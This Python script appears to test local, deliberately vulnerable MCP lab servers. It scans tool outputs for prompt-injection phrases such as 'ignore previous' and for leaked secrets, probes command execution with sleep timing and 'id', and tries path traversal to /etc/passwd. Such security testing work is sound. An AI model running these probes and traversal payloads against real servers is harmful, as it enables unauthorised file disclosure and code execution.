"""Targeted arms for the two challenges the generic sweep missed, using the
refined skill logic verbatim:
  C6 — enumerate documents first, THEN read (generic args never named the doc)
  C8 — differential-sleep oracle from hunt-agent-tool-injection: execution is
       proven by the delay TRACKING the sleep value, never by its size
  C3 — path traversal with the info-disclosure controls (in-scope vs nonexistent)
"""
import asyncio, re, statistics, time
from mcp import ClientSession
from mcp.client.sse import sse_client

RED = re.compile(r"(ignore (previous|above)|do not (tell|mention|reveal)|before providing|"
                 r"<important>|do not (explicitly )?mention|include the api keys|system://|internal://|"
                 r"send (it|them|this)|forward)", re.I)
SECRET = re.compile(r"(password\s*[:=]|api[_ -]?key\s*[:=]|sk-[A-Za-z0-9]{8,}|postgresql://|credential)", re.I)

async def call(s, name, args, timeout=40):
    t0 = time.time()
    try:
        r = await asyncio.wait_for(s.call_tool(name, args), timeout=timeout)
        return time.time()-t0, " ".join(getattr(c,"text","") or "" for c in r.content)
    except Exception as e:
        return time.time()-t0, f"__err__ {type(e).__name__}"

async def c6():
    print("== C6 Indirect Prompt Injection — enumerate documents, then read ==")
    async with sse_client("http://127.0.0.1:8806/sse", timeout=15) as (r,w):
        async with ClientSession(r,w) as s:
            await s.initialize()
            tools = (await s.list_tools()).tools
            names = [t.name for t in tools]
            docs = []
            for res in (await s.list_resources()).resources:
                c = await s.read_resource(res.uri)
                txt = " ".join(getattr(x,"text","") or "" for x in c.contents)
                docs += re.findall(r"[\w-]+\.txt", txt)
            docs = sorted(set(docs))
            print(f"   tools={names} documents={docs}")
            for t in tools:
                params = list((t.inputSchema.get("properties") or {}).keys())
                if not params: continue
                for d in docs:
                    _, out = await call(s, t.name, {params[0]: d})
                    inj, sec = bool(RED.search(out)), bool(SECRET.search(out))
                    if inj or sec:
                        print(f"   [!!!] {t.name}({d}) -> injection={inj} secret={sec}")
                        print(f"         {out[:160]!r}")

async def c8():
    print("\n== C8 Malicious Code Execution — differential-sleep oracle ==")
    async with sse_client("http://127.0.0.1:8808/sse", timeout=15) as (r,w):
        async with ClientSession(r,w) as s:
            await s.initialize()
            tools = {t.name: list((t.inputSchema.get("properties") or {}).keys())
                     for t in (await s.list_tools()).tools}
            print(f"   tools={list(tools)}")
            probes = {"execute_shell_command": lambda n: f"sleep {n}",
                      "execute_python_code":   lambda n: f"import time; time.sleep({n})"}
            for tool, mk in probes.items():
                if tool not in tools: continue
                p = tools[tool][0]
                await call(s, tool, {p: mk(0)})                          # burn cold start
                base = statistics.median([(await call(s, tool, {p: mk(0)}))[0] for _ in range(3)])
                d3 = (await call(s, tool, {p: mk(3)}))[0]
                d9 = (await call(s, tool, {p: mk(9)}))[0]
                scaling = (d9-base) - (d3-base)
                verdict = "EXECUTION (delay tracks N)" if scaling > (9-3)*0.6 else "not execution"
                print(f"   {tool}: base {base:.2f}s | sleep3 +{d3-base:.2f}s | sleep9 +{d9-base:.2f}s "
                      f"| scaling {scaling:+.2f}s -> {verdict}")
                _, out = await call(s, tool, {p: "id" if "shell" in tool else "import os;print(os.getuid())"})
                print(f"      proof-of-execution output: {out[:90]!r}")

async def c3():
    print("\n== C3 Excessive Permission Scope — traversal with controls ==")
    async with sse_client("http://127.0.0.1:8803/sse", timeout=15) as (r,w):
        async with ClientSession(r,w) as s:
            await s.initialize()
            tools = {t.name: list((t.inputSchema.get("properties") or {}).keys())
                     for t in (await s.list_tools()).tools}
            tool = next((t for t in tools if "read" in t or "file" in t), None)
            if not tool: print("   no file tool"); return
            p = tools[tool][0]
            _, inscope = await call(s, tool, {p: "public_file1.txt"})
            _, missing = await call(s, tool, {p: "zzz-nope-9931.txt"})
            print(f"   control: in-scope != nonexistent? {inscope[:40] != missing[:40]}")
            for path in ["/etc/passwd", "../../../../etc/passwd", "/tmp/dvmcp_challenge3/private/secrets.txt"]:
                _, out = await call(s, tool, {p: path})
                novel = out[:40] not in (inscope[:40], missing[:40])
                hit = "root:" in out or SECRET.search(out)
                print(f"   {path:44} -> {'[!!!] READ' if (hit and novel) else 'no'} {out[:60]!r}")

async def main():
    await c6(); await c8(); await c3()
asyncio.run(main())
